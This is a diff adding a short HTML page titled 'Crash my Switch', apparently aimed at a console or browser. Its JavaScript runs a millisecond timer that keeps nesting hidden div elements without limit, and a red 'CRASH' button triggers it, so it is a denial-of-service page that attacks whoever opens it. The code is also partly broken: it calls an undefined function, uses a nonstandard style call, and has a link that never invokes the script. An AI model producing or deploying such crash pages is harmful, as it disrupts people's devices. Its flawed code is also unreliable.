@@ -1,1 +1,36 @@
 
+<html>
+    <head>
+        <title>Crash my Switch</title>
+</head>
+<body>
+<script type="text/javascript" language="JavaScript">
+			function Test_ElementOverflow ()
+			{
+				if ( Warning2() )
+				{
+					x = document.createElement('div');
+					document.body.appendChild(x);
+					$(x).style('display', 'none');
+					_ElementOverflow();
+				}
+			}
+			
+			function _ElementOverflow ()
+			{
+				var y;
+				for ( var i = 0; i < 50; i++ )
+				{
+					y = document.createElement('div');
+					y.className = 'element_foom';
+					x.appendChild(y);
+					x = y;
+				}
+				i = document.getElementsByTagName('div');	//	Hee, hee, hee.
+				setTimeout(_ElementOverflow, 1);
+			}
+			
+		</script>
+		<a class="btn btn-danger" href="javascript: Test_ElementOverflow"><span class="glyphicon glyphicon-google" aria-hidden="true"></span> CRASH</a>
+		</body>
+</html>
